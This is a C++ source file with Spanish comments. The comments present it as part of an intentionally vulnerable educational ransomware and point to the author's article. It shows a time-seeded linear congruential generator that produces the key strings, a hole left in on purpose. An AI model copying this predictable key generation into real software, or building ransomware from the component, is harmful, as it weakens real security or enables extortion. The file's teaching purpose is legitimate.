//ppp
#include <iostream>
#include <cstdint>
#include <string>
#include <vector>
#include <chrono>
#include <filesystem>
#include <cstdlib>
#include "functions.h"

namespace fs = std::filesystem;

/*
Yo creo que esta demas explicar esto, debido a que ya lo explique en el
articulo, pero para los que les de flojera leerlo hare un resumen.

Esta clase llamada LinearCongruencialGenerator, es simplemente un algoritmo
de generacion de numeros pseudoaleatorios, esto quiere decir que genera numeros
al "aleatoriamente", obviamente este algoritmo es inseguro y no se recomiendo usar
en proyectos reales, pero el chiste de este ransomware es que sea vulnerable
para poder enseñar que con solo un detalle que puede parecer tonto, se te puede
caer todo el negocio.
*/


class LinearCongruencialGenerator
{
private:
	uint64_t state;
	const uint64_t a = 931545873;     	//Estos numeros son constantes, me da un poco de
	const uint64_t c = 101390427; 		//de weba explicar como conseguirlos, pero cada uno
	const uint64_t m = 1073741824; 		//tiene que seguir unos parametros para que sean "seguros"
public:
	LinearCongruencialGenerator(uint64_t seed): state(seed) {}
	uint32_t next() {
		state = (a * state + c) % m;  
		return static_cast<uint32_t>(state);
	}
	/*
	Esta formula de aca abajo es interesante, porque nos permite generar numeros
	pseudoaletorios en un rango especifico, creo esta funcion porque de primeras
	el algoritmo genera numeros grandes, y esos numeros no nos servirian para
	por ejemplo crear un string aleatorio, entonces hacemos que vayan por rango
	por ejemplo que cree numeros entre el 1 y 100.
	*/

	uint32_t range_pseudorandom_number(int min , int max){
		uint32_t range = max - min + 1;
		return(next() % range) + min;
	}
};


std::string generate_pseudorandom_string(int size_string , long long seed){
	/*
	inicializamos el algoritmo con su respectiva semilla.

	Todo esto de la semilla y el porque lo hice asi, lo explique en
	mi articulo, porfavor leanlo que me da flojera explicar esto aca
	*/
	LinearCongruencialGenerator rng(seed); 

	std::vector<unsigned char>pseudo_random_string;
	pseudo_random_string.reserve(size_string);

	/*
	Se que parecen pocos caracteres, pero creanme que aun asi
	la posibilidad de adivinar una llave con solo esos caracteres
	es imposible.
	*/

	std::string characters_to_use = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
	for(int i = 0; i < size_string; i++){
		pseudo_random_string.push_back(characters_to_use[rng.range_pseudorandom_number(0 , characters_to_use.size() - 1)]);
	}
	std::string string_to_return(reinterpret_cast<const char *>(pseudo_random_string.data()) , pseudo_random_string.size());
	return string_to_return;
}

/*
Aca lo que hacemos es obtener el tiempo actual de la computadora
para luego convertirlo a unix time, y usar ese unix time como semilla
*/
uint64_t get_time_to_rng(){
	auto ahora = std::chrono::system_clock::now();
    auto tiempo_desde_epoch = ahora.time_since_epoch();
    auto segundos = std::chrono::duration_cast<std::chrono::seconds>(tiempo_desde_epoch);    
    return segundos.count();
}